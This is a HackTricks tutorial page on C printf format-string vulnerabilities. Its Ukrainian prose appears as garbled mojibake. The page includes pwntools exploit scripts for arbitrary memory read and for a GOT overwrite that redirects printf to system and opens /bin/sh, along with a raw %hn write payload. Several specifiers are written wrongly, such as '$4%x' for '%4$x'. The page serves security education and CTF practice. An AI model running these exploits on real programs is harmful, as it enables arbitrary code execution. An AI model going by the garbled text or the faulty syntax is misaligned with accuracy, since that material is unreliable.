# –§–æ—Ä–º–∞—Ç–Ω—ñ —Ä—è–¥–∫–∏

{% hint style="success" %}
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>–ü—ñ–¥—Ç—Ä–∏–º–∞–π—Ç–µ HackTricks</summary>

* –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ø–ª–∞–Ω–∏ –ø—ñ–¥–ø–∏—Å–∫–∏**](https://github.com/sponsors/carlospolop)!
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ Telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –≤ **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **–î—ñ–ª—ñ—Ç—å—Å—è —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞—é—á–∏ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ –Ω–∞ GitHub.

</details>
{% endhint %}

## –û—Å–Ω–æ–≤–Ω–∞ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è

–£ C **`printf`** —î —Ñ—É–Ω–∫—Ü—ñ—è, —è–∫–∞ –º–æ–∂–µ –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–∞ –¥–ª—è **–≤–∏–≤–µ–¥–µ–Ω–Ω—è** –¥–µ—è–∫–æ–≥–æ —Ä—è–¥–∫–∞. **–ü–µ—Ä—à–∏–π –ø–∞—Ä–∞–º–µ—Ç—Ä**, —è–∫–∏–π –æ—á—ñ–∫—É—î —Ü—è —Ñ—É–Ω–∫—Ü—ñ—è, - —Ü–µ **—Å–∏—Ä–∏–π —Ç–µ–∫—Å—Ç –∑ —Ñ–æ—Ä–º–∞—Ç–µ—Ä–∞–º–∏**. **–ù–∞—Å—Ç—É–ø–Ω—ñ –ø–∞—Ä–∞–º–µ—Ç—Ä–∏**, —è–∫—ñ –æ—á—ñ–∫—É—é—Ç—å—Å—è, - —Ü–µ **–∑–Ω–∞—á–µ–Ω–Ω—è** –¥–ª—è **–∑–∞–º—ñ–Ω–∏** **—Ñ–æ—Ä–º–∞—Ç–µ—Ä—ñ–≤** –∑ —Å–∏—Ä–æ–≥–æ —Ç–µ–∫—Å—Ç—É.

–í—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å –≤–∏–Ω–∏–∫–∞—î, –∫–æ–ª–∏ **—Ç–µ–∫—Å—Ç –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è —è–∫ –ø–µ—Ä—à–∏–π –∞—Ä–≥—É–º–µ–Ω—Ç** –¥–ª—è —Ü—ñ—î—ó —Ñ—É–Ω–∫—Ü—ñ—ó. –ó–ª–æ–≤–º–∏—Å–Ω–∏–∫ –∑–º–æ–∂–µ —Å—Ç–≤–æ—Ä–∏—Ç–∏ **—Å–ø–µ—Ü—ñ–∞–ª—å–Ω–∏–π –≤—Ö—ñ–¥, –∑–ª–æ–≤–∂–∏–≤–∞—é—á–∏** –º–æ–∂–ª–∏–≤–æ—Å—Ç—è–º–∏ **—Ñ–æ—Ä–º–∞—Ç–Ω–æ–≥–æ —Ä—è–¥–∫–∞ printf** –¥–ª—è —á–∏—Ç–∞–Ω–Ω—è —Ç–∞ **–∑–∞–ø–∏—Å—É –±—É–¥—å-—è–∫–∏—Ö –¥–∞–Ω–∏—Ö –∑–∞ –±—É–¥—å-—è–∫–æ—é –∞–¥—Ä–µ—Å–æ—é (—á–∏—Ç–∞–±–µ–ª—å–Ω–∞/–∑–∞–ø–∏—Å—É–≤–∞–Ω–∞)**. –¢–∞–∫–∏–º —á–∏–Ω–æ–º, –º–∞—é—á–∏ –º–æ–∂–ª–∏–≤—ñ—Å—Ç—å **–≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏ –¥–æ–≤—ñ–ª—å–Ω–∏–π –∫–æ–¥**.

#### –§–æ—Ä–º–∞—Ç–µ—Ä–∏:
```bash
%08x ‚Äî> 8 hex bytes
%d ‚Äî> Entire
%u ‚Äî> Unsigned
%s ‚Äî> String
%n ‚Äî> Number of written bytes
%hn ‚Äî> Occupies 2 bytes instead of 4
<n>$X ‚Äî> Direct access, Example: ("%3$d", var1, var2, var3) ‚Äî> Access to var3
```
**–ü—Ä–∏–∫–ª–∞–¥–∏:**

* –í—Ä–∞–∑–ª–∏–≤–∏–π –ø—Ä–∏–∫–ª–∞–¥:
```c
char buffer[30];
gets(buffer);  // Dangerous: takes user input without restrictions.
printf(buffer);  // If buffer contains "%x", it reads from the stack.
```
* –ù–æ—Ä–º–∞–ª—å–Ω–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è:
```c
int value = 1205;
printf("%x %x %x", value, value, value);  // Outputs: 4b5 4b5 4b5
```
* –ó –≤—ñ–¥—Å—É—Ç–Ω—ñ–º–∏ –∞—Ä–≥—É–º–µ–Ω—Ç–∞–º–∏:
```c
printf("%x %x %x", value);  // Unexpected output: reads random values from the stack.
```
### **–î–æ—Å—Ç—É–ø –¥–æ –≤–∫–∞–∑—ñ–≤–Ω–∏–∫—ñ–≤**

–§–æ—Ä–º–∞—Ç **`%<n>$x`**, –¥–µ `n` - —Ü–µ —á–∏—Å–ª–æ, –¥–æ–∑–≤–æ–ª—è—î –≤–∫–∞–∑–∞—Ç–∏ printf –≤–∏–±—Ä–∞—Ç–∏ n –ø–∞—Ä–∞–º–µ—Ç—Ä (–∑ —Å—Ç–µ–∫—É). –û—Ç–∂–µ, —è–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –ø—Ä–æ—á–∏—Ç–∞—Ç–∏ 4-–π –ø–∞—Ä–∞–º–µ—Ç—Ä –∑—ñ —Å—Ç–µ–∫—É, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ printf, –≤–∏ –º–æ–∂–µ—Ç–µ –∑—Ä–æ–±–∏—Ç–∏:
```c
printf("%x %x %x %x")
```
—ñ –≤–∏ –± —á–∏—Ç–∞–ª–∏ –∑ –ø–µ—Ä—à–æ–≥–æ –¥–æ —á–µ—Ç–≤–µ—Ä—Ç–æ–≥–æ –ø–∞—Ä–∞–º–µ—Ç—Ä–∞.

–ê–±–æ –≤–∏ –º–æ–≥–ª–∏ –± –∑—Ä–æ–±–∏—Ç–∏:
```c
printf("$4%x")
```
—ñ –±–µ–∑–ø–æ—Å–µ—Ä–µ–¥–Ω—å–æ –ø—Ä–æ—á–∏—Ç–∞—Ç–∏ —á–µ—Ç–≤–µ—Ä—Ç–∏–π.

–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ –∞—Ç–∞–∫—É—é—á–∏–π –∫–æ–Ω—Ç—Ä–æ–ª—é—î –ø–∞—Ä–∞–º–µ—Ç—Ä `pr`**`intf`**, —â–æ –≤ –æ—Å–Ω–æ–≤–Ω–æ–º—É –æ–∑–Ω–∞—á–∞—î, —â–æ** –π–æ–≥–æ –≤–≤–µ–¥–µ–Ω–Ω—è –±—É–¥–µ –≤ —Å—Ç–µ–∫—É, –∫–æ–ª–∏ –≤–∏–∫–ª–∏–∫–∞—î—Ç—å—Å—è `printf`, —â–æ –æ–∑–Ω–∞—á–∞—î, —â–æ –≤—ñ–Ω –º–æ–∂–µ –∑–∞–ø–∏—Å—É–≤–∞—Ç–∏ –∫–æ–Ω–∫—Ä–µ—Ç–Ω—ñ –∞–¥—Ä–µ—Å–∏ –ø–∞–º'—è—Ç—ñ –≤ —Å—Ç–µ–∫.

{% hint style="danger" %}
–ê—Ç–∞–∫—É—é—á–∏–π, —â–æ –∫–æ–Ω—Ç—Ä–æ–ª—é—î —Ü–µ–π –≤–≤—ñ–¥, –∑–º–æ–∂–µ **–¥–æ–¥–∞—Ç–∏ –¥–æ–≤—ñ–ª—å–Ω—É –∞–¥—Ä–µ—Å—É –≤ —Å—Ç–µ–∫ —ñ –∑–º—É—Å–∏—Ç–∏ `printf` –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ –Ω–∏—Ö**. –£ –Ω–∞—Å—Ç—É–ø–Ω–æ–º—É —Ä–æ–∑–¥—ñ–ª—ñ –±—É–¥–µ –ø–æ—è—Å–Ω–µ–Ω–æ, —è–∫ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —Ü—é –ø–æ–≤–µ–¥—ñ–Ω–∫—É.
{% endhint %}

## **–î–æ–≤—ñ–ª—å–Ω–µ –ß–∏—Ç–∞–Ω–Ω—è**

–ú–æ–∂–ª–∏–≤–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —Ñ–æ—Ä–º–∞—Ç–µ—Ä **`$n%s`**, —â–æ–± –∑–º—É—Å–∏—Ç–∏ **`printf`** –æ—Ç—Ä–∏–º–∞—Ç–∏ **–∞–¥—Ä–µ—Å—É**, —â–æ –∑–Ω–∞—Ö–æ–¥–∏—Ç—å—Å—è –≤ **n –ø–æ–∑–∏—Ü—ñ—ó**, —Å–ª—ñ–¥—É—é—á–∏ –∑–∞ –Ω–µ—é, —ñ **–¥—Ä—É–∫—É–≤–∞—Ç–∏ —ó—ó —Ç–∞–∫, –Ω—ñ–±–∏ —Ü–µ —Ä—è–¥–æ–∫** (–¥—Ä—É–∫—É–≤–∞—Ç–∏ –¥–æ —Ç–∏—Ö –ø—ñ—Ä, –ø–æ–∫–∏ –Ω–µ –±—É–¥–µ –∑–Ω–∞–π–¥–µ–Ω–æ 0x00). –û—Ç–∂–µ, —è–∫—â–æ –±–∞–∑–æ–≤–∞ –∞–¥—Ä–µ—Å–∞ –±—ñ–Ω–∞—Ä–Ω–æ–≥–æ —Ñ–∞–π–ª—É **`0x8048000`**, —ñ –º–∏ –∑–Ω–∞—î–º–æ, —â–æ –≤–≤–µ–¥–µ–Ω–Ω—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –ø–æ—á–∏–Ω–∞—î—Ç—å—Å—è –∑ 4-—ó –ø–æ–∑–∏—Ü—ñ—ó –≤ —Å—Ç–µ—Ü—ñ, –º–æ–∂–ª–∏–≤–æ –Ω–∞–¥—Ä—É–∫—É–≤–∞—Ç–∏ –ø–æ—á–∞—Ç–æ–∫ –±—ñ–Ω–∞—Ä–Ω–æ–≥–æ —Ñ–∞–π–ª—É –∑:
```python
from pwn import *

p = process('./bin')

payload = b'%6$p' #4th param
payload += b'xxxx' #5th param (needed to fill 8bytes with the initial input)
payload += p32(0x8048000) #6th param

p.sendline(payload)
log.info(p.clean()) # b'\x7fELF\x01\x01\x01||||'
```
{% hint style="danger" %}
–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ –≤–∏ –Ω–µ –º–æ–∂–µ—Ç–µ –ø–æ—Å—Ç–∞–≤–∏—Ç–∏ –∞–¥—Ä–µ—Å—É 0x8048000 –Ω–∞ –ø–æ—á–∞—Ç–∫—É –≤–≤–µ–¥–µ–Ω–Ω—è, –æ—Å–∫—ñ–ª—å–∫–∏ —Ä—è–¥–æ–∫ –±—É–¥–µ –æ–±—ñ—Ä–≤–∞–Ω–æ –Ω–∞ 0x00 –≤ –∫—ñ–Ω—Ü—ñ —Ü—ñ—î—ó –∞–¥—Ä–µ—Å–∏.
{% endhint %}

## **–í–∏–ø–∞–¥–∫–æ–≤–µ –∑–∞–ø–∏—Å—É–≤–∞–Ω–Ω—è**

–§–æ—Ä–º–∞—Ç–µ—Ä **`$<num>%n`** **–∑–∞–ø–∏—Å—É—î** **–∫—ñ–ª—å–∫—ñ—Å—Ç—å –∑–∞–ø–∏—Å–∞–Ω–∏—Ö –±–∞–π—Ç—ñ–≤** –≤ **–≤–∫–∞–∑–∞–Ω—É –∞–¥—Ä–µ—Å—É** –≤ –ø–∞—Ä–∞–º–µ—Ç—Ä—ñ \<num> –≤ —Å—Ç–µ–∫—É. –Ø–∫—â–æ –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –º–æ–∂–µ –∑–∞–ø–∏—Å–∞—Ç–∏ —Å—Ç—ñ–ª—å–∫–∏ —Å–∏–º–≤–æ–ª—ñ–≤, —Å–∫—ñ–ª—å–∫–∏ –∑–∞—Ö–æ—á–µ, –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é printf, –≤—ñ–Ω –∑–º–æ–∂–µ –∑–º—É—Å–∏—Ç–∏ **`$<num>%n`** –∑–∞–ø–∏—Å–∞—Ç–∏ –≤–∏–ø–∞–¥–∫–æ–≤–µ —á–∏—Å–ª–æ –≤ –≤–∏–ø–∞–¥–∫–æ–≤—É –∞–¥—Ä–µ—Å—É.

–ù–∞ —â–∞—Å—Ç—è, —â–æ–± –∑–∞–ø–∏—Å–∞—Ç–∏ —á–∏—Å–ª–æ 9999, –Ω–µ –ø–æ—Ç—Ä—ñ–±–Ω–æ –¥–æ–¥–∞–≤–∞—Ç–∏ 9999 "A" –¥–æ –≤–≤–µ–¥–µ–Ω–Ω—è, –¥–ª—è —Ü—å–æ–≥–æ –º–æ–∂–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —Ñ–æ—Ä–º–∞—Ç–µ—Ä **`%.<num-write>%<num>$n`**, —â–æ–± –∑–∞–ø–∏—Å–∞—Ç–∏ —á–∏—Å–ª–æ **`<num-write>`** –≤ **–∞–¥—Ä–µ—Å—É, –Ω–∞ —è–∫—É –≤–∫–∞–∑—É—î –ø–æ–∑–∏—Ü—ñ—è `num`**.
```bash
AAAA%.6000d%4\$n ‚Äî> Write 6004 in the address indicated by the 4¬∫ param
AAAA.%500\$08x ‚Äî> Param at offset 500
```
–û–¥–Ω–∞–∫, –∑–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ –∑–∞–∑–≤–∏—á–∞–π –¥–ª—è –∑–∞–ø–∏—Å—É –∞–¥—Ä–µ—Å–∏, —Ç–∞–∫–æ—ó —è–∫ `0x08049724` (—â–æ —î –í–ï–õ–ò–ß–ï–ó–ù–ò–ú —á–∏—Å–ª–æ–º –¥–ª—è –∑–∞–ø–∏—Å—É –æ–¥–Ω–æ—á–∞—Å–Ω–æ), **–≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è `$hn`** –∑–∞–º—ñ—Å—Ç—å `$n`. –¶–µ –¥–æ–∑–≤–æ–ª—è—î **–∑–∞–ø–∏—Å–∞—Ç–∏ –ª–∏—à–µ 2 –±–∞–π—Ç–∏**. –¢–æ–º—É —Ü—è –æ–ø–µ—Ä–∞—Ü—ñ—è –≤–∏–∫–æ–Ω—É—î—Ç—å—Å—è –¥–≤—ñ—á—ñ: –æ–¥–∏–Ω —Ä–∞–∑ –¥–ª—è –Ω–∞–π–≤–∏—â–∏—Ö 2B –∞–¥—Ä–µ—Å–∏ —ñ —â–µ —Ä–∞–∑ –¥–ª—è –Ω–∞–π–Ω–∏–∂—á–∏—Ö.

–û—Ç–∂–µ, —Ü—è –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å –¥–æ–∑–≤–æ–ª—è—î **–∑–∞–ø–∏—Å—É–≤–∞—Ç–∏ —â–æ –∑–∞–≤–≥–æ–¥–Ω–æ –≤ –±—É–¥—å-—è–∫—É –∞–¥—Ä–µ—Å—É (–ø—Ä–æ–∏–∑–≤–æ–ª—å–Ω–∏–π –∑–∞–ø–∏—Å).**

–£ —Ü—å–æ–º—É –ø—Ä–∏–∫–ª–∞–¥—ñ –º–µ—Ç–æ—é –±—É–¥–µ **–ø–µ—Ä–µ–∑–∞–ø–∏—Å–∞—Ç–∏** **–∞–¥—Ä–µ—Å—É** **—Ñ—É–Ω–∫—Ü—ñ—ó** –≤ —Ç–∞–±–ª–∏—Ü—ñ **GOT**, —è–∫–∞ –±—É–¥–µ –≤–∏–∫–ª–∏–∫–∞–Ω–∞ –ø—ñ–∑–Ω—ñ—à–µ. –•–æ—á–∞ —Ü–µ –º–æ–∂–µ –∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏ —ñ–Ω—à–∏–º–∏ —Ç–µ—Ö–Ω—ñ–∫–∞–º–∏ –ø—Ä–æ–∏–∑–≤–æ–ª—å–Ω–æ–≥–æ –∑–∞–ø–∏—Å—É –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è:

{% content-ref url="../arbitrary-write-2-exec/" %}
[arbitrary-write-2-exec](../arbitrary-write-2-exec/)
{% endcontent-ref %}

–ú–∏ –±—É–¥–µ–º–æ **–ø–µ—Ä–µ–∑–∞–ø–∏—Å—É–≤–∞—Ç–∏** **—Ñ—É–Ω–∫—Ü—ñ—é**, —è–∫–∞ **–æ—Ç—Ä–∏–º—É—î** —Å–≤–æ—ó **–∞—Ä–≥—É–º–µ–Ω—Ç–∏** –≤—ñ–¥ **–∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞** —ñ **–≤–∫–∞–∑—É—î** –Ω–∞ **—Ñ—É–Ω–∫—Ü—ñ—é** **`system`**.\
–Ø–∫ –∑–≥–∞–¥—É–≤–∞–ª–æ—Å—è, –¥–ª—è –∑–∞–ø–∏—Å—É –∞–¥—Ä–µ—Å–∏ –∑–∞–∑–≤–∏—á–∞–π –ø–æ—Ç—Ä—ñ–±–Ω–æ 2 –∫—Ä–æ–∫–∏: —Å–ø–æ—á–∞—Ç–∫—É **–∑–∞–ø–∏—Å—É—î—Ç—å—Å—è 2 –±–∞–π—Ç–∏** –∞–¥—Ä–µ—Å–∏, –∞ –ø–æ—Ç—ñ–º —ñ–Ω—à—ñ 2. –î–ª—è —Ü—å–æ–≥–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è **`$hn`**.

* **HOB** –≤–∏–∫–ª–∏–∫–∞—î—Ç—å—Å—è –¥–ª—è 2 –≤–∏—â–∏—Ö –±–∞–π—Ç—ñ–≤ –∞–¥—Ä–µ—Å–∏
* **LOB** –≤–∏–∫–ª–∏–∫–∞—î—Ç—å—Å—è –¥–ª—è 2 –Ω–∏–∂—á–∏—Ö –±–∞–π—Ç—ñ–≤ –∞–¥—Ä–µ—Å–∏

–ü–æ—Ç—ñ–º, —á–µ—Ä–µ–∑ —Ç–µ, —è–∫ –ø—Ä–∞—Ü—é—î —Ñ–æ—Ä–º–∞—Ç —Ä—è–¥–∫–∞, –≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ **—Å–ø–æ—á–∞—Ç–∫—É –∑–∞–ø–∏—Å–∞—Ç–∏ –Ω–∞–π–º–µ–Ω—à–∏–π** –∑ \[HOB, LOB\] —ñ –ø–æ—Ç—ñ–º —ñ–Ω—à–∏–π.

–Ø–∫—â–æ HOB < LOB\
`[address+2][address]%.[HOB-8]x%[offset]\$hn%.[LOB-HOB]x%[offset+1]`

–Ø–∫—â–æ HOB > LOB\
`[address+2][address]%.[LOB-8]x%[offset+1]\$hn%.[HOB-LOB]x%[offset]`

HOB LOB HOB\_shellcode-8 N¬∫Param\_dir\_HOB LOB\_shell-HOB\_shell N¬∫Param\_dir\_LOB

{% code overflow="wrap" %}
```bash
python -c 'print "\x26\x97\x04\x08"+"\x24\x97\x04\x08"+ "%.49143x" + "%4$hn" + "%.15408x" + "%5$hn"'
```
{% endcode %}

### –®–∞–±–ª–æ–Ω Pwntools

–í–∏ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ —à–∞–±–ª–æ–Ω –¥–ª—è –ø—ñ–¥–≥–æ—Ç–æ–≤–∫–∏ –µ–∫—Å–ø–ª–æ–π—Ç—É –¥–ª—è —Ü—å–æ–≥–æ —Ç–∏–ø—É –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ –≤:

{% content-ref url="format-strings-template.md" %}
[format-strings-template.md](format-strings-template.md)
{% endcontent-ref %}

–ê–±–æ —Ü–µ–π –±–∞–∑–æ–≤–∏–π –ø—Ä–∏–∫–ª–∞–¥ –∑ [**—Ç—É—Ç**](https://ir0nstone.gitbook.io/notes/types/stack/got-overwrite/exploiting-a-got-overwrite):
```python
from pwn import *

elf = context.binary = ELF('./got_overwrite-32')
libc = elf.libc
libc.address = 0xf7dc2000       # ASLR disabled

p = process()

payload = fmtstr_payload(5, {elf.got['printf'] : libc.sym['system']})
p.sendline(payload)

p.clean()

p.sendline('/bin/sh')

p.interactive()
```
## –Ü–Ω—à—ñ –ø—Ä–∏–∫–ª–∞–¥–∏ —Ç–∞ –ø–æ—Å–∏–ª–∞–Ω–Ω—è

* [https://ir0nstone.gitbook.io/notes/types/stack/format-string](https://ir0nstone.gitbook.io/notes/types/stack/format-string)
* [https://www.youtube.com/watch?v=t1LH9D5cuK4](https://www.youtube.com/watch?v=t1LH9D5cuK4)
* [https://guyinatuxedo.github.io/10-fmt\_strings/pico18\_echo/index.html](https://guyinatuxedo.github.io/10-fmt\_strings/pico18\_echo/index.html)
* 32 –±—ñ—Ç–∏, –±–µ–∑ relro, –±–µ–∑ canary, nx, –±–µ–∑ pie, –±–∞–∑–æ–≤–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è —Ñ–æ—Ä–º–∞—Ç–Ω–∏—Ö —Ä—è–¥–∫—ñ–≤ –¥–ª—è –≤–∏—Ç–æ–∫—É –ø—Ä–∞–ø–æ—Ä–∞ –∑—ñ —Å—Ç–µ–∫—É (–Ω–µ–º–∞—î –ø–æ—Ç—Ä–µ–±–∏ –∑–º—ñ–Ω—é–≤–∞—Ç–∏ –ø–æ—Ç—ñ–∫ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è)
* [https://guyinatuxedo.github.io/10-fmt\_strings/backdoor17\_bbpwn/index.html](https://guyinatuxedo.github.io/10-fmt\_strings/backdoor17\_bbpwn/index.html)
* 32 –±—ñ—Ç–∏, relro, –±–µ–∑ canary, nx, –±–µ–∑ pie, —Ñ–æ—Ä–º–∞—Ç–Ω–∏–π —Ä—è–¥–æ–∫ –¥–ª—è –ø–µ—Ä–µ–∑–∞–ø–∏—Å—É –∞–¥—Ä–µ—Å–∏ `fflush` –∑ —Ñ—É–Ω–∫—Ü—ñ—î—é win (ret2win)
* [https://guyinatuxedo.github.io/10-fmt\_strings/tw16\_greeting/index.html](https://guyinatuxedo.github.io/10-fmt\_strings/tw16\_greeting/index.html)
* 32 –±—ñ—Ç–∏, relro, –±–µ–∑ canary, nx, –±–µ–∑ pie, —Ñ–æ—Ä–º–∞—Ç–Ω–∏–π —Ä—è–¥–æ–∫ –¥–ª—è –∑–∞–ø–∏—Å—É –∞–¥—Ä–µ—Å–∏ –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ main –≤ `.fini_array` (—â–æ–± –ø–æ—Ç—ñ–∫ –ø–æ–≤–µ—Ä–Ω—É–≤—Å—è —â–µ —Ä–∞–∑) —ñ –∑–∞–ø–∏—Å—É –∞–¥—Ä–µ—Å–∏ –¥–æ `system` –≤ —Ç–∞–±–ª–∏—Ü—ñ GOT, —â–æ –≤–∫–∞–∑—É—î –Ω–∞ `strlen`. –ö–æ–ª–∏ –ø–æ—Ç—ñ–∫ –ø–æ–≤–µ—Ä—Ç–∞—î—Ç—å—Å—è –¥–æ main, `strlen` –≤–∏–∫–æ–Ω—É—î—Ç—å—Å—è –∑ –≤–≤–µ–¥–µ–Ω–Ω—è–º –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ —ñ –≤–∫–∞–∑—É—î –Ω–∞ `system`, –≤—ñ–Ω –≤–∏–∫–æ–Ω–∞—î –ø–µ—Ä–µ–¥–∞–Ω—ñ –∫–æ–º–∞–Ω–¥–∏.

{% hint style="success" %}
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>–ü—ñ–¥—Ç—Ä–∏–º–∫–∞ HackTricks</summary>

* –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ø–ª–∞–Ω–∏ –ø—ñ–¥–ø–∏—Å–∫–∏**](https://github.com/sponsors/carlospolop)!
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ Telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –≤ **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **–î—ñ–ª—ñ—Ç—å—Å—è —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞—é—á–∏ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ –Ω–∞ github.

</details>
{% endhint %}
